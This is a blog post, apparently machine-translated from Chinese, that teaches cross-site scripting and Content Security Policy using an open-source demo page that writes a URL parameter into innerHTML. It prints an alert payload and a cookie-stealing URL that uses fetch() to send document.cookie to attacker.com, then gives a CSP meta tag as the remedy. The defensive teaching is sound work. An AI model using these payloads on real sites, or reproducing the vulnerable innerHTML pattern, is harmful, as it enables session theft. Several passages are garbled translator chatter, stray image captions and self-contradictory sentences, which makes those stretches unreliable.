---
title: "What is a CSP header? Why can some people steal your information without realizing it?"
description: "The Content Security Policy (CSP) is a security mechanism designed to prevent attackers from injecting malicious scripts into your website to steal user data."
category: "Record"
published: 2025-07-31
image: '../../assets/images/e245d917-2255-4d2d-85fb-aa7538a18022.webp'
tags: [XSS攻击, CSP]
draft: false 
lang: en
---
:::ai-summary[AI Summary]{model="google/gemma-3-1b"}

:::

# Let me illustrate this with an example.

This is a website without CSP headers. [Click Here](https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27XSS%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%27)

Without any surprise, your browser will display a notification.

![](../../assets/images/b279f283-b5d2-4dbd-955e-5b3bba6ff656.webp)

# How is this accomplished?

This project is open-source on [afoim/none_csp_demo](https://github.com/afoim/none_csp_demo).

Please provide the HTML content! I need the text to translate it into professional English.

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>欢迎页面</title>
</head>
<body>
  <h1>欢迎</h1>
  <p>你好，<span id="name"></span>！</p>

  <script>
    // 从 URL 参数读取用户名并显示
    const params = new URLSearchParams(location.search);
    const name = params.get("name");
    document.getElementById("name").innerHTML = name;
  </script>
</body>
</html>
```

This website is remarkably simple; the webpage dynamically displays the username via a query parameter `?name=xxx`.

Here’s the translation:  “The website will display a message indicating that it is experiencing issues.”

![](../../assets/images/366d0934-9c3a-4196-a7ae-1c230c916daf.webp)

According to the source code, web pages are inserted of text directly using `innerHTML`.

This method lacks security review, directly embedding the content into HTML.

Therefore, if we were to provide a website with `name`?

尝试输入

The provided URL is a security alert generated by a Cross-Site Scripting (XSS) vulnerability. The code within the image displays an error message that suggests malicious JavaScript code has been injected into the page. This indicates a potential attack where attackers attempt to exploit vulnerabilities in the website’s code to execute harmful scripts. Remediation involves identifying and removing the offending code, strengthening input validation, and implementing security best practices to prevent similar attacks from occurring in the future.

You will find that the website does not print out any usernames, and a strange window appears in your browser.

![](../../assets/images/e86cfeed-a9d4-402b-aed0-fc3624f3e925.webp)

We are using F12 to examine the source code of the current webpage.

![](../../assets/images/ad38bc52-e689-4923-b79c-894dc9ab4136.webp)

Here’s the translation:  “In the context of `name`”

A cross-site scripting (XSS) attack has been inserted.

The webpage does not parse the `name` input as pure text.

The text directly inserted HTML elements.

The browser is not rendering correctly. `Error message displayed: "Browser has not rendered."` ]

Instead of directly executing the `<img src="x" onerror="alert('XSS attack successful')">` HTML tag, it has been executed.

Due to `src=x`, retrieval is impossible, and the setting of `onerror` triggers a rollback mechanism.

Due to the browser directly executing the script `alert('XSS attack successful')`, this alert has been triggered.

# What are the potential risks?

Here’s a professional translation of the text:  “To adapt to new situations, we can leverage existing solutions to proactively address challenges.”

That also allows one to accomplish other tasks.

The attacker can completely fabricate a URL and send it to you, for example **Obtain your browser cookies and then send them to the specified server**.
`https://victim-site.com/page?name=<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">`

# How to implement CSP (Content Security Policy) to mitigate these types of attacks?

Please access this URL, which implements strict Content Security Policy (CSP) measures.

The image displays an alert message triggered by a cross-site scripting (XSS) attack. The message alerts users to the potential for malicious code injection into the website. This highlights a critical security vulnerability that requires immediate attention and remediation.

You will not see a popup window, and the F12 browser console will display an error.

![](../../assets/images/2febeecf-6f54-4c6a-b775-ef2ac8598f37.webp)

**Here is the translation and explanation provided by GPT:**

**翻译：**

Due to a violation of the CSP (Content Security Policy) directive, executing inline scripts is prohibited. To enable inline scripting, you must utilize the ``unsafe-inline`` keyword, specify a hash value (e.g., ``'sha256-raHeKmhSLYgI2dPMTS+XHraijHkbV3RTs8np6RhiKqQ='`), or utilize a random number (e.g., ``'nonce-...'``).

**Explanation**:  The provided text requires further clarification to provide a precise translation.  Please provide the original text you would like me to translate. Without knowing the context, I can only offer a generic response.
Your CSP policy restricts the loading of scripts originating from within the same domain (`'self'`). However, you have included an inline script `<script>...</script>` within your HTML page. This is a violation of the current CSP and prevents its execution.

We successfully mitigated XSS attacks.

In the HTML `<head>` section, add the following content.

```html
  <!-- 安全的 CSP 策略 -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
  ">
```

# How can I ensure the security of my data?

1. If you are operating a website, ensure that each site has implemented strict CSP (Content Security Policy) strategies. This will effectively block XSS attacks, even if an attacker attempts to inject malicious scripts.

2. Please avoid clicking on links or scanning QR codes from unknown sources. First, analyze the final URL before accessing it. Assess the risk and proceed only if you’re confident in the security of the site. Consider using a “no-trace” mode for access.  It's possible the target website lacks strict CSP (Content Security Policy) measures, which could expose your personal data.